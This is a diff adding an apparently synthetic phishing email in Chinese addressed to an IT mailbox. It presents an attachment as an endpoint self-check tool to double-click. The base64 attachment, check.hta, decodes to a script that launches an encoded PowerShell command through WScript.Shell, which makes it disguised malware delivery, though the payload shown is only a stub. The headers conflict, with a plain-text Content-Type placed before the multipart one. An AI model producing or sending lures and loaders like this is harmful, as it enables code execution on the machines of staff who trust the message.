@@ -1,0 +1,21 @@
+From: =?utf-8?B?57O757uf5qOA5p+l?= <check@corp-scan-relay.example>
+To: it@corp.internal
+Date: Wed, 09 Sep 2026 08:27:00 +0800
+Message-ID: <0017-b17@synth.example>
+Subject: 终端自检工具（双击运行）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+自检工具见附件，运行后将结果截图回复。
+--BS
+Content-Type: application/hta
+Content-Disposition: attachment; filename="check.hta"
+Content-Transfer-Encoding: base64
+
+PHNjcmlwdD5uZXcgQWN0aXZlWE9iamVjdCgnV1NjcmlwdC5TaGVsbCcpLlJ1bigncG93ZXJzaGVsbCAtZW5jIEFBJyk7PC9zY3JpcHQ+
+--BS--
